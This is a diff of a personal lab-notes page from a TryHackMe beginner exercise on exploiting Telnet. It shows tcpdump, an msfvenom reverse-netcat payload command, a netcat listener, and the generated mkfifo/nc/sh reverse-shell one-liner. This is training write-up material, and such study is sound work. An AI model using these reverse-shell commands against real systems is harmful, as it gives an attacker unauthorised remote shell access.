@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-10-02
-
 # Network Services
 
 ## Exploiting Telnet
@@ -19,10 +14,12 @@ author: 100007
 # Listen for ICMP ping packets on an interface:
 #
 sudo tcpdump ip proto \icmp -i $IFACE
+
 # Use Metasploit to generate the code for a remote shell:
 # 
 msfvenom -p cmd/unix/reverse_netcat lhost=$LOCAL_IP \
-lport=$LOCAL_PORT R
+	lport=$LOCAL_PORT R
+
 # Spin up a listener using netcat:
 #
 nc -lvp $LOCAL_PORT
@@ -32,9 +29,9 @@ In this exercise, Metasploit generates code that looks like this:
 
 ```
 mkfifo /tmp/qdsrgu; \
-nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | \
-/bin/sh >/tmp/qdsrgu 2>&1; \
-rm /tmp/qdsrgu
+	nc $LOCAL_IP $LOCAL_PORT 0</tmp/qdsrgu | \
+	/bin/sh >/tmp/qdsrgu 2>&1; \
+	rm /tmp/qdsrgu
 ```
 
 ($LOCAL\_IP and $LOCAL\_PORT aren’t literal - they’re _actually_ the local IP address of my machine on TryHackMe’s VPN and my chosen port. Neither of which should be particularly sensitive, but I’m still not going to post it on the internet!)
